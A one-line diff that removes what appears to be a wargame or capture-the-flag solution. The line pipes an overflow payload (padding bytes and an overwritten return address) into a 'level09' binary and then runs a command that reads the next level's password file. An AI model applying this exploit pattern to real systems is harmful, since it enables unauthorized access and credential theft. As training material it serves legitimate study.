@@ -1,1 +1,0 @@
-~/level09 < <(python -c 'print "\x90" * 40 + "\xff\n" + "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n" + "cat /home/users/end/.pass"')
